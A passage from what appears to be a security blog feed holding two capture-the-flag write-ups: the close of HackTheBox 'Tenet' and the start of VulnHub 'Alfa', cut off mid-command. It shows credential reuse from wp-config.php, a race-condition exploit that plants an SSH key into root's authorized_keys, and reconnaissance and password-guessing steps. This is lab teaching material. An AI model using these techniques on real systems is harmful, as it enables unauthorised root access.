<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-neil">Shell as neil</h3>
<h4 id="wp-config">WP config</h4>
<p>I found Neil&rsquo;s credentials inside the <code>wp-config.php</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">www-data@tenet:/var/www/html/wordpress$ cat wp-config.php
cat wp-config.php
&lt;?php

...&lt;SNIP&gt;...
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;wordpress&#39;</span> <span style="color:#f92672">)</span>;

/** MySQL database username */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;neil&#39;</span> <span style="color:#f92672">)</span>;

/** MySQL database password */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;Opera2112&#39;</span> <span style="color:#f92672">)</span>;
...&lt;SNIP&gt;...
</code></pre></div><h4 id="ssh---neil">SSH - Neil</h4>
<p>The credentials works on SSH (<code>neil:Opera2112</code>)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31»
$ ssh neil@10.10.10.223
neil@10.10.10.223<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
Welcome to Ubuntu 18.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-129-generic x86_64<span style="color:#f92672">)</span>

...&lt;SNIP&gt;...

Last login: Mon Jun <span style="color:#ae81ff">14</span> 12:57:27 <span style="color:#ae81ff">2021</span> from 10.10.16.12
neil@tenet:~$ id
uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>neil<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>neil<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>neil<span style="color:#f92672">)</span>
</code></pre></div><p>User&rsquo;s flag is done here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neil@tenet:~$ ls -l
total <span style="color:#ae81ff">4</span>
-r-------- <span style="color:#ae81ff">1</span> neil neil <span style="color:#ae81ff">33</span> Jun <span style="color:#ae81ff">14</span> 06:46 user.txt
</code></pre></div><p><img class="img-container" src="imgs/image-20210614200613572.png" alt="image-20210614200613572"  />
</p>
<hr>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="sudo-privileges">Sudo privileges</h4>
<p>User neil has sudo privileges on a custom script called <code>enableSSH.sh</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neil@tenet:~$ sudo -l
Matching Defaults entries <span style="color:#66d9ef">for</span> neil on tenet:
    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>

User neil may run the following commands on tenet:
    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/local/bin/enableSSH.sh
neil@tenet:~$ 
</code></pre></div><h4 id="script-analysis">Script analysis</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">neil@tenet:~$ ls -l /usr/local/bin/enableSSH.sh
-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1080</span> Dec  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2020</span> /usr/local/bin/enableSSH.sh
neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
<span style="color:#75715e">#!/bin/bash</span>

checkAdded<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>

        sshName<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/bin/echo $key | /usr/bin/cut -d <span style="color:#e6db74">&#34; &#34;</span> -f 3<span style="color:#66d9ef">)</span>

        <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! -z <span style="color:#66d9ef">$(</span>/bin/grep $sshName /root/.ssh/authorized_keys<span style="color:#66d9ef">)</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>

                /bin/echo <span style="color:#e6db74">&#34;Successfully added </span>$sshName<span style="color:#e6db74"> to authorized_keys file!&#34;</span>

        <span style="color:#66d9ef">else</span>

                /bin/echo <span style="color:#e6db74">&#34;Error in adding </span>$sshName<span style="color:#e6db74"> to authorized_keys file!&#34;</span>

        <span style="color:#66d9ef">fi</span>

<span style="color:#f92672">}</span>

checkFile<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>

        <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! -s $1 <span style="color:#f92672">]]</span> <span style="color:#f92672">||</span> <span style="color:#f92672">[[</span> ! -f $1 <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>

                /bin/echo <span style="color:#e6db74">&#34;Error in creating key file!&#34;</span>

                <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> -f $1 <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span> /bin/rm $1; <span style="color:#66d9ef">fi</span>

                exit <span style="color:#ae81ff">1</span>

        <span style="color:#66d9ef">fi</span>

<span style="color:#f92672">}</span>

addKey<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>

        tmpName<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span style="color:#66d9ef">)</span>

        <span style="color:#f92672">(</span>umask 110; touch $tmpName<span style="color:#f92672">)</span>

        /bin/echo $key &gt;&gt;$tmpName

        checkFile $tmpName

        /bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys

        /bin/rm $tmpName

<span style="color:#f92672">}</span>

key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&#34;</span>
addKey
checkAdded
</code></pre></div><p>The contents of the <code>$key</code> variable will be saved to a temporary file at <code>/tmp/SSH-randomfilename</code> before being added to the <code>/root/.ssh/authorized_keys file</code> by the <code>addKey()</code> function.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neil@tenet:~$ tmpName<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span style="color:#66d9ef">)</span>
neil@tenet:~$ echo $tmpName
/tmp/ssh-4swbpcnN
</code></pre></div><p>The  <code>checkAdded</code> will take the  <code>username@hostname</code> part from <code>$key</code> value and check if that value is already exist in <code>/root/.ssh/authorized_keys</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">...&lt;SNIP&gt;...
 <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! -z <span style="color:#66d9ef">$(</span>/bin/grep $sshName /root/.ssh/authorized_keys<span style="color:#66d9ef">)</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
                /bin/echo <span style="color:#e6db74">&#34;Successfully added </span>$sshName<span style="color:#e6db74"> to authorized_keys file!&#34;</span>
        <span style="color:#66d9ef">else</span>
                /bin/echo <span style="color:#e6db74">&#34;Error in adding </span>$sshName<span style="color:#e6db74"> to authorized_keys file!&#34;</span>
        <span style="color:#66d9ef">fi</span>
...&lt;SNIP&gt;...
</code></pre></div><p>So, it&rsquo;s a race condition.</p>
<p>The idea here is if I could overwrite the file contents of <code>/tmp/ssh-randomfilename</code> with my own public key then I should be able to log in as root using my private key.</p>
<h4 id="exploiting-enablesshsh">Exploiting enableSSH.sh</h4>
<p>Just like how I did earlier on <a href="https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/#exploiting-scanloserssh">ScriptKiddie</a>, I&rsquo;ll also use while loop to keep inserting my public key at <code>/tmp/ssh-*</code>, but this time, I&rsquo;ll use a binary called <code>tee</code>.</p>
<p>First, I&rsquo;ll put my public key at Neil&rsquo;s home directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neil@tenet:~$ echo <span style="color:#e6db74">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... root@iamf&#39;</span> &gt; .iamf
</code></pre></div><p>Then I&rsquo;ll run this loop to make user <code>neil</code> keep doing sudo.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neil@tenet:~$ <span style="color:#66d9ef">while</span> sleep 1; <span style="color:#66d9ef">do</span> sudo /usr/local/bin/enableSSH.sh; <span style="color:#66d9ef">done</span>;
</code></pre></div><p>I&rsquo;ll open another neil&rsquo;s session and run this</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neil@tenet:~$ <span style="color:#66d9ef">while</span> sleep 0.1; <span style="color:#66d9ef">do</span> cat .iamf | tee /tmp/ssh-*;<span style="color:#66d9ef">done</span>
</code></pre></div><p>When I see there is a &ldquo;Error in adding root@ubuntu to authorized_keys file!&rdquo; message, then I should be able to login as root.</p>
<p>After some minutes, I can finally login as root.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ ssh root@10.10.10.223
Welcome to Ubuntu 18.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-129-generic x86_64<span style="color:#f92672">)</span>

...&lt;SNIP&gt;...

Last login: Mon Jun <span style="color:#ae81ff">14</span> 14:23:52 <span style="color:#ae81ff">2021</span> from 10.10.16.12
root@tenet:~# id
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
root@tenet:~# ls -l
total <span style="color:#ae81ff">4</span>
-r-------- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">33</span> Jun <span style="color:#ae81ff">14</span> 06:46 root.txt
root@tenet:~# 
</code></pre></div><p><img class="img-container" src="imgs/image-20210614213529219.png" alt="image-20210614213529219"  />
</p>
<p><strong>Update</strong>: I found out that sometimes I can login as root even without seeing the error message. So I decided to use while loop for SSH login.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31»
$ <span style="color:#66d9ef">while</span> sleep 1; <span style="color:#66d9ef">do</span> ssh -oConnectTimeout<span style="color:#f92672">=</span>1s -oPasswordAuthentication<span style="color:#f92672">=</span>no root@10.10.10.223 2&gt;/dev/null; <span style="color:#66d9ef">done</span>
</code></pre></div><p><img class="img-container" src="imgs/image-20210615165352952.png" alt="image-20210615165352952"  />
</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection">https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>VulnHub - Alfa</title>
      <link>https://fahmifj.github.io/writeups/vulnhub/vh-alfa/</link>
      <pubDate>Sun, 13 Jun 2021 16:55:14 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/vulnhub/vh-alfa/</guid>
      <description>Check your browser scrollbar!</description>
      <content:encoded><![CDATA[<p>Alfa starts with enumeration on FTP to obtain a username and an image file, and the image file is named after the user&rsquo;s pet. Alfa&rsquo;s website has a robots.txt  file which contains an obfuscated web path to intranet chat support. The chat conversation reveals sensitive information, and with this, I&rsquo;m able to guess the user&rsquo;s password and gain a foothold on the system. In the user&rsquo;s home directory, there is a VNC password and it can be used to log into the currently running VNC server as root.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Generating password list</li>
<li>Brute-force FTP and SSH</li>
<li>VNC password decrypt</li>
<li>SSH tunneling</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>Hydra</li>
<li>Crackmapexec</li>
<li>FTP client</li>
<li>Gobuster</li>
<li>Brainfuck decoder - <a href="https://www.dcode.fr/brainfuck-language">https://www.dcode.fr/brainfuck-language</a></li>
<li>VNCviewer</li>
<li>pspy</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial scan with <code>nmap</code> discovers four open ports: FTP on port 21, HTTP on port 80, SMB on port 139 and 445.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ nmap -sC -sV -oA nmap/10-initial-alfa 192.168.2.109 -v
<span style="color:#75715e"># Nmap 7.80 scan initiated Thu Apr 22 02:41:12 2021 as: nmap -sC -sV -oA nmap/10-initial-alfa -v 192.168.2.109</span>
Nmap scan report <span style="color:#66d9ef">for</span> 192.168.2.109
Host is up <span style="color:#f92672">(</span>0.00056s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">996</span> closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
|_drwxr-xr-x    <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">17</span> 13:02 thomas
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.2.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was <span style="color:#ae81ff">3</span>
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp  open  http        Apache httpd 2.4.38 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.38 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
|_http-title: Alfa IT Solutions
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
MAC Address: 08:00:27:9C:8A:46 <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
Service Info: Host: ALFA; OS: Unix

Host script results:
|_clock-skew: mean: -40m01s, deviation: 1h09m16s, median: -2s
| nbstat: NetBIOS name: ALFA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span style="color:#f92672">(</span>unknown<span style="color:#f92672">)</span>
| Names:
|   ALFA&lt;00&gt;             Flags: &lt;unique&gt;&lt;active&gt;
|   ALFA&lt;03&gt;             Flags: &lt;unique&gt;&lt;active&gt;
|   ALFA&lt;20&gt;             Flags: &lt;unique&gt;&lt;active&gt;
|   <span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>02__MSBROWSE__<span style="color:#ae81ff">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
| smb-os-discovery: 
|   OS: Windows 6.1 <span style="color:#f92672">(</span>Samba 4.9.5-Debian<span style="color:#f92672">)</span>
|   Computer name: alfa
|   NetBIOS computer name: ALFA<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
|   Domain name: <span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
|   FQDN: alfa
|_  System time: 2021-04-22T08:41:36+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-22T06:41:36
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Thu Apr 22 02:41:38 2021 -- 1 IP address (1 host up) scanned in 26.16 seconds</span>
</code></pre></div><p><code>nmap</code> identified anonymous access is allowed on FTP.</p>
<p>Performing a full port scan, discovers the fifth port.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ nmap -p- nmap/10-allports-alfa 192.168.2.109 -v
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-04-22 02:53 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 192.168.2.109
Host is up <span style="color:#f92672">(</span>0.00040s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65530</span> closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
65111/tcp open  unknown
MAC Address: 08:00:27:9C:8A:46 <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>

Read data files from: /usr/bin/../share/nmap
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 36.32 seconds
           Raw packets sent: <span style="color:#ae81ff">65536</span> <span style="color:#f92672">(</span>2.884MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">65536</span> <span style="color:#f92672">(</span>2.621MB<span style="color:#f92672">)</span>
</code></pre></div><p>Poking port 65111 with <code>nc</code> reveals it&rsquo;s SSH.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ nc 192.168.2.109 <span style="color:#ae81ff">65111</span>
SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-21---ftp">TCP 21 - FTP</h3>
<p>Enumeration with on FTP discovers a potential username called <code>thomas</code>, an image file named <code>milo.jpg</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ ftp 192.168.2.109 
Connected to 192.168.2.109.
<span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 3.0.3<span style="color:#f92672">)</span>
Name <span style="color:#f92672">(</span>192.168.2.109:root<span style="color:#f92672">)</span>: anonymous
<span style="color:#ae81ff">331</span> Please specify the password.
Password:
<span style="color:#ae81ff">230</span> Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; dir
<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
<span style="color:#ae81ff">150</span> Here comes the directory listing.
drwxr-xr-x    <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">17</span> 13:02 thomas
<span style="color:#ae81ff">226</span> Directory send OK.
ftp&gt; cd thomas
<span style="color:#ae81ff">250</span> Directory successfully changed.
ftp&gt; dir
<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
<span style="color:#ae81ff">150</span> Here comes the directory listing.
-rw-r--r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>          <span style="color:#ae81ff">104068</span> Dec <span style="color:#ae81ff">17</span> 12:49 milo.jpg
</code></pre></div><p><code>milo.jpg</code> is a picture of a dog.</p>
<p><img class="img-container" src="imgs/image-20210613181756997.png" alt="image-20210613181756997"  />
</p>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>On SMB, anonymous access is allowed but no read permission there.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ crackmapexec smb 192.168.2.109 -u <span style="color:#e6db74">&#39;ANONYMOUS&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
SMB         192.168.2.109   <span style="color:#ae81ff">445</span>    ALFA             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 6.1 <span style="color:#f92672">(</span>name:ALFA<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
SMB         192.168.2.109   <span style="color:#ae81ff">445</span>    ALFA             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#ae81ff">\A</span>NONYMOUS: 
SMB         192.168.2.109   <span style="color:#ae81ff">445</span>    ALFA             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerated shares
SMB         192.168.2.109   <span style="color:#ae81ff">445</span>    ALFA             Share           Permissions     Remark
SMB         192.168.2.109   <span style="color:#ae81ff">445</span>    ALFA             -----           -----------     ------
SMB         192.168.2.109   <span style="color:#ae81ff">445</span>    ALFA             print$                          Printer Drivers
SMB         192.168.2.109   <span style="color:#ae81ff">445</span>    ALFA             IPC$                            IPC Service <span style="color:#f92672">(</span>Samba 4.9.5-Debian<span style="color:#f92672">)</span>
</code></pre></div><h3 id="tcp-80---web">TCP 80 - Web</h3>
<p>Visiting port 80 shows a website titled with &ldquo;Alfa IT Solutions&rdquo;.</p>
<p><img class="img-container" src="imgs/image-20210422143723577.png" alt="image-20210422143723577"  />
</p>
<p>Nothing useful on the page source.</p>
<h4 id="gobuster">Gobuster</h4>
<p><code>gobuster</code> scan discovers a <code>robot.txt</code> file</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ gobuster dir -u http://192.168.2.109/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -o gobuster/gobuster-L-80 
<span style="color:#f92672">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://192.168.2.109/
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              html,txt,bak
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
<span style="color:#f92672">===============================================================</span>
2021/04/22 02:46:48 Starting gobuster in directory enumeration mode
<span style="color:#f92672">===============================================================</span>
/js                   <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 311<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.2.109/js/<span style="color:#f92672">]</span>
/images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 315<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.2.109/images/<span style="color:#f92672">]</span>
/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 312<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.2.109/css/<span style="color:#f92672">]</span>   
/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3870<span style="color:#f92672">]</span>                                  
/fonts                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 314<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.2.109/fonts/<span style="color:#f92672">]</span> 
/robots.txt           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 459<span style="color:#f92672">]</span>                                   
/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 278<span style="color:#f92672">]</span> 
</code></pre></div><h4 id="robotstxt">robots.txt</h4>
<p>Accessing <code>robots.txt</code> discovers some directories. But, these are just dummy.</p>
<p><img class="img-container" src="imgs/image-20210422134810181.png" alt="image-20210422134810181"  />
</p>
<p>Poking the <code>robots.txt</code> file with <code>curl</code> discovers a string which looks like a brainfuck language.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ curl -s http://192.168.2.109/robots.txt
/home <span style="color:#75715e">#404</span>
/admin <span style="color:#75715e">#404</span>
/login <span style="color:#75715e">#404</span>
/images <span style="color:#75715e">#200, directory listing, nothing interesting</span>
/cgi-bin <span style="color:#75715e">#404</span>
/intranet <span style="color:#75715e">#404</span>
/wp-admin <span style="color:#75715e">#404</span>
/wp-login <span style="color:#75715e">#404</span>

...&lt;SNIP&gt;...
++++++++++<span style="color:#f92672">[</span>&gt;+&gt;+++&gt;+++++++&gt;++++++++++<span style="color:#f92672">&lt;&lt;&lt;</span>&lt;-<span style="color:#f92672">]</span>&gt;&gt;+++++++++++++++++.&gt;&gt;---.+++++++++++.------.-----.&lt;&lt;--.&gt;&gt;++++++++++++++++++.++.-----..-.+++.++.
</code></pre></div><p>The string is translated as <code>/alfa-support</code> on <a href="https://www.dcode.fr/brainfuck-language">site</a>,</p>
<p><img class="img-container" src="imgs/image-20210613181246585.png" alt="image-20210613181246585"  />
</p>
<h4 id="alfa-support">/alfa-support</h4>
<p>On <code>/alfa-support</code>, there is a chat between Thomas as the employee and the IT support operator (I think?).</p>
<p><img class="img-container" src="imgs/image-20210422143814423.png" alt="image-20210422143814423"  />
</p>
<p>From the conversation above, I&rsquo;ll note that Thomas uses a password that consists of his(or her?) pet&rsquo;s name followed by 3 numerical digits.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-thomas">Shell as Thomas</h3>
<h4 id="creating-wordlist">Creating Wordlist</h4>
<p>From the previous FTP enumeration, &lsquo;milo&rsquo; is most likely the name of Thomas&rsquo;s pet.  With <code>bash</code>, I could generate all the possible password used by Thomas.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
